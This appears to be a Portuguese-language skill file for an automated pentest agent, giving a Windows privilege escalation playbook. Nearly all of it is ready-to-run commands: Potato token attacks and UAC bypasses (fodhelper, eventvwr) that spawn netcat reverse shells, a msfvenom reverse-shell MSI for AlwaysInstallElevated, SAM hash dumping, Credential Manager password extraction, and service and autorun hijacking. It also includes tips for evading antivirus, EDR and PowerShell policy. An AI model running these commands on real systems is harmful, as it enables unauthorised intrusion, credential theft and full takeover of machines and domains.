---
name: windows_privilege_escalation
phase: 5_post_exploitation
tools: [winpeas, powershell, impacket]
dependencies: [credentials_found]
mitre_tactic: TA0004 (Privilege Escalation)
---

# Objetivo
Escalar privilégios de um usuário comum para SYSTEM/Administrator em ambientes Windows, explorando misconfigurations de serviços, token impersonation, unquoted service paths, DLL hijacking, credenciais armazenadas, scheduled tasks, GPO abusáveis e técnicas de UAC bypass. Inclui coleta de dados para BloodHound visando identificar caminhos de escalação em ambientes Active Directory.

# Condições de Execução
- Acesso ao sistema Windows foi obtido (reverse shell, RDP ou WinRM).
- O usuário atual NÃO possui privilégios administrativos (ou deseja escalar para SYSTEM).
- Credenciais válidas (`{username}` / `{password}`) estão disponíveis.
- O diretório `{workspace}` existe para armazenar resultados.

# Comandos e Sintaxe

## 1. WinPEAS — Enumeração Automatizada

Upload do binário e execução completa com output detalhado:
```bash
# Upload via SMB ou download direto no alvo
smbclient //{target_ip}/C$ -U '{username}%{password}' -c 'put winPEASx64.exe Windows\Temp\winPEASx64.exe' 2>&1 | tee {workspace}/winpriv_upload.txt

# Execução remota via impacket
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\winPEASx64.exe quiet servicesinfo applicationsinfo networkinfo usersinfo windowscreds' 2>&1 | tee {workspace}/winpriv_winpeas.txt
```

Alternativa caso o antivírus bloqueie o binário — versão em .bat:
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\winPEAS.bat' 2>&1 | tee {workspace}/winpriv_winpeas_bat.txt
```

## 2. PowerUp.ps1 — Service Misconfigurations

Carregamento do módulo PowerUp e execução do Invoke-AllChecks para identificar serviços mal configurados:
```bash
# Via evil-winrm ou shell PowerShell remota
evil-winrm -i {target_ip} -u '{username}' -p '{password}' -s /opt/PowerSploit/Privesc/ -e 'Bypass-4MSI; Import-Module PowerUp.ps1; Invoke-AllChecks | Out-File C:\Windows\Temp\powerup_results.txt' 2>&1 | tee {workspace}/winpriv_powerup.txt
```

Comandos individuais para checks específicos:
```powershell
# Serviços com permissão de escrita no binário
Get-ModifiableServiceFile | Format-List
# Serviços com ACL abusável
Get-ModifiableService | Format-List
# Unquoted service paths
Get-UnquotedService | Format-List
```

## 3. Token Impersonation — Potato Attacks

Técnicas que exploram privilégios `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` para escalar para SYSTEM.

### 3.1 JuicyPotato (Windows Server 2016/2019, Windows 10 < 1809)
```bash
# Verificar se o privilégio existe
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'whoami /priv' 2>&1 | tee {workspace}/winpriv_token_privs.txt

# Execução do JuicyPotato para obter reverse shell como SYSTEM
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe {target_ip} 4444 -e cmd.exe" -t *' 2>&1 | tee {workspace}/winpriv_juicypotato.txt
```

### 3.2 PrintSpoofer (Windows 10 / Server 2019+)
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "C:\Windows\Temp\nc.exe {target_ip} 4444 -e cmd.exe"' 2>&1 | tee {workspace}/winpriv_printspoofer.txt
```

### 3.3 GodPotato (Funciona em múltiplas versões do Windows)
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe {target_ip} 4444 -e cmd.exe"' 2>&1 | tee {workspace}/winpriv_godpotato.txt
```

## 4. Unquoted Service Paths

Identificação e exploração de caminhos de serviço sem aspas que contenham espaços:
```bash
# Enumeração de serviços com unquoted paths
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"' 2>&1 | tee {workspace}/winpriv_unquoted.txt

# Verificar permissões de escrita nos diretórios do path
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'icacls "C:\Program Files\Vulnerable App"' 2>&1 | tee -a {workspace}/winpriv_unquoted.txt
```

Para explorar, crie um payload com o nome correspondente ao path fragmentado (ex: `C:\Program.exe` ou `C:\Program Files\Vulnerable.exe`) e reinicie o serviço.

## 5. DLL Hijacking Detection

Identificação de DLLs ausentes que serviços tentam carregar:
```bash
# Listar DLLs que falharam ao carregar (requer Process Monitor ou análise manual)
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'powershell -c "Get-ChildItem -Path C:\Windows\Temp -Filter *.dll -ErrorAction SilentlyContinue; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* | Select-Object PSChildName,ImagePath | Format-Table -AutoSize"' 2>&1 | tee {workspace}/winpriv_dll_hijack.txt

# Verificar diretórios graváveis no PATH do sistema
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'powershell -c "$env:PATH -split \";\" | ForEach-Object { if(Test-Path $_) { icacls $_ } }"' 2>&1 | tee -a {workspace}/winpriv_dll_hijack.txt
```

## 6. AlwaysInstallElevated

Verificação se pacotes MSI podem ser instalados com privilégios elevados:
```bash
# Consulta nas duas chaves de registro necessárias
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated' 2>&1 | tee {workspace}/winpriv_alwaysinstall.txt
```

Se ambas retornarem valor `0x1`, gere um MSI malicioso e instale:
```bash
# Gerar payload MSI com msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST={target_ip} LPORT=4445 -f msi -o {workspace}/evil.msi 2>&1 | tee -a {workspace}/winpriv_alwaysinstall.txt

# Instalar remotamente
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'msiexec /quiet /qn /i C:\Windows\Temp\evil.msi' 2>&1 | tee -a {workspace}/winpriv_alwaysinstall.txt
```

## 7. Stored Credentials — cmdkey e SAM Dump

### 7.1 Credenciais armazenadas com cmdkey
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'cmdkey /list' 2>&1 | tee {workspace}/winpriv_stored_creds.txt
```

Se credenciais forem encontradas, use `runas /savecred` para executar comandos como o usuário salvo:
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'runas /savecred /user:Administrator "C:\Windows\Temp\nc.exe {target_ip} 4446 -e cmd.exe"' 2>&1 | tee -a {workspace}/winpriv_stored_creds.txt
```

### 7.2 SAM Dump via impacket
```bash
# Dump remoto das hashes SAM, SYSTEM e SECURITY
impacket-secretsdump '{target_domain}/{username}:{password}@{target_ip}' 2>&1 | tee {workspace}/winpriv_sam_dump.txt
```

### 7.3 Extração de credenciais do Credential Manager via PowerShell
```bash
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'powershell -c "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ | Select-Object Resource,UserName,Password }"' 2>&1 | tee -a {workspace}/winpriv_stored_creds.txt
```

## 8. Scheduled Tasks e Weak Permissions

Enumeração de tarefas agendadas e verificação de permissões fracas nos executáveis referenciados:
```bash
# Listar todas as scheduled tasks com detalhes
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'schtasks /query /fo LIST /v' 2>&1 | tee {workspace}/winpriv_schtasks.txt

# Filtrar tasks que executam como SYSTEM ou Administrator
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'schtasks /query /fo LIST /v | findstr /i "TaskName Author Run"' 2>&1 | tee -a {workspace}/winpriv_schtasks.txt

# Verificar permissões de escrita no binário da task
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'icacls "C:\Path\To\Scheduled\Binary.exe"' 2>&1 | tee -a {workspace}/winpriv_schtasks.txt
```

Se o binário da task tiver permissão de escrita para o usuário atual, substitua-o por um payload para obter execução como o usuário da task.

## 9. BloodHound — Coleta de Dados com SharpHound

Coleta de informações do Active Directory para análise de caminhos de escalação no BloodHound:
```bash
# Upload e execução do SharpHound
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'C:\Windows\Temp\SharpHound.exe --collectionmethods All --domain {target_domain} --outputdirectory C:\Windows\Temp\bloodhound' 2>&1 | tee {workspace}/winpriv_bloodhound.txt

# Download dos resultados
smbclient //{target_ip}/C$ -U '{username}%{password}' -c 'cd Windows\Temp\bloodhound; mget *.zip' 2>&1 | tee -a {workspace}/winpriv_bloodhound.txt
```

Alternativa com coleta remota via bloodhound-python (sem tocar no alvo):
```bash
bloodhound-python -u '{username}' -p '{password}' -d {target_domain} -ns {target_ip} -c All 2>&1 | tee -a {workspace}/winpriv_bloodhound.txt
```

Após a coleta, importe os arquivos `.zip` ou `.json` no BloodHound GUI e procure por:
- **Shortest Path to Domain Admin** — caminho mais curto até DA.
- **Kerberoastable Accounts** — contas com SPN definido.
- **AS-REP Roastable Users** — contas sem pré-autenticação Kerberos.
- **Unconstrained Delegation** — máquinas que permitem delegação irrestrita.

## 10. UAC Bypass Techniques

Técnicas para contornar o User Account Control quando o usuário pertence ao grupo Administrators mas não tem token elevado:
```bash
# Verificar nível do UAC
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA & reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin' 2>&1 | tee {workspace}/winpriv_uac.txt

# Técnica fodhelper.exe (Windows 10)
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\nc.exe {target_ip} 4447 -e cmd.exe" /f & reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f & fodhelper.exe' 2>&1 | tee -a {workspace}/winpriv_uac.txt

# Técnica eventvwr.exe (alternativa)
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\Windows\Temp\nc.exe {target_ip} 4447 -e cmd.exe" /f & eventvwr.exe' 2>&1 | tee -a {workspace}/winpriv_uac.txt
```

## 11. Registry Autorun Abuse

Identificação e exploração de programas de inicialização automática com permissões fracas:
```bash
# Enumerar entradas de autorun no registro
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run & reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' 2>&1 | tee {workspace}/winpriv_autorun.txt

# Verificar permissões nos executáveis listados
impacket-wmiexec '{target_domain}/{username}:{password}@{target_ip}' 'powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | ForEach-Object { $_.PSObject.Properties | Where-Object { $_.Name -ne \"PSPath\" -and $_.Name -ne \"PSParentPath\" -and $_.Name -ne \"PSChildName\" -and $_.Name -ne \"PSProvider\" } | ForEach-Object { icacls $_.Value.Split()[0] } }"' 2>&1 | tee -a {workspace}/winpriv_autorun.txt
```

Se algum executável de autorun for gravável pelo usuário atual, substitua-o por um payload. A execução ocorre no próximo logon do usuário afetado.

# Análise de Resultados

| Indicador | Significado | Ação Recomendada |
|-----------|-------------|------------------|
| `SeImpersonatePrivilege` habilitado | Token impersonation possível | Usar PrintSpoofer ou GodPotato |
| WinPEAS marca serviço em **vermelho** | Misconfiguration crítica encontrada | Explorar via PowerUp ou manualmente |
| `AlwaysInstallElevated = 0x1` em HKLM e HKCU | MSI instala como SYSTEM | Gerar MSI malicioso com msfvenom |
| `cmdkey /list` retorna credenciais | Credenciais salvas disponíveis | Usar `runas /savecred` |
| Unquoted path com espaço em diretório gravável | Hijack de serviço possível | Criar binário no path fragmentado |
| SAM dump retorna hashes NTLM | Hashes disponíveis para cracking ou pass-the-hash | Acionar skill `hash_dumping_and_cracking` |
| SharpHound identifica path to DA | Caminho de escalação no domínio | Seguir path no BloodHound GUI |
| Scheduled task com binário gravável | Code execution como usuário da task | Substituir binário por payload |
| Autorun com executável gravável | Persistência + escalação no próximo logon | Substituir executável |
| UAC `ConsentPromptBehaviorAdmin = 0` | UAC desabilitado — token já é elevado | Não é necessário bypass |
| DLL ausente em diretório gravável | DLL hijacking possível | Compilar DLL maliciosa e posicionar |

# Próximos Passos
- Se obtiver SYSTEM, acione a skill `hash_dumping_and_cracking` para extrair hashes NTLM do SAM e LSASS.
- Em ambiente de domínio, acione a skill `lateral_movement_psexec` para movimentação lateral com credenciais obtidas.
- Utilize os dados do BloodHound para planejar escalação até Domain Admin.
- Acione a skill `mitre_attack_mapping` para mapear as técnicas utilizadas (T1134, T1574.001, T1574.002, T1053.005, T1547.001, T1548.002).
- Documente todos os vetores de escalação encontrados para o relatório final com a skill `generate_pentest_report`.

# Tratamento de Erros
- **WinPEAS bloqueado por antivírus/EDR:** Execute as verificações manuais dos itens 2 a 8 individualmente. Use a versão `.bat` ou ofuscada do WinPEAS.
- **PowerShell bloqueado por política de execução:** Use `powershell -ep bypass -c "..."` ou `powershell -encodedcommand <base64>` para contornar a restrição.
- **Impacket retorna `STATUS_ACCESS_DENIED`:** Verifique se as credenciais são válidas e se o usuário possui permissão de logon remoto. Tente protocolo alternativo (WinRM via evil-winrm).
- **Potato attacks falham com erro de CLSID:** Teste CLSIDs diferentes. Consulte a lista de CLSIDs válidos por versão do Windows em https://ohpe.it/juicy-potato/CLSID/.
- **SharpHound é detectado pelo AV:** Use a versão ofuscada ou colete remotamente com `bloodhound-python` (item 9).
- **UAC bypass não funciona:** Verifique se o usuário pertence ao grupo Administrators. Se `ConsentPromptBehaviorAdmin = 2` (prompt seguro), técnicas de auto-elevate não funcionam — tente escalação via serviços ou Potato attacks.
- **Timeout em conexões remotas:** Verifique regras de firewall e tente portas alternativas. Use `impacket-smbexec` ou `impacket-atexec` como alternativas ao `wmiexec`.
- **DLL hijacking requer restart do serviço:** Verifique se o usuário possui permissão `SERVICE_START` no serviço alvo com `sc sdshow <service_name>`.
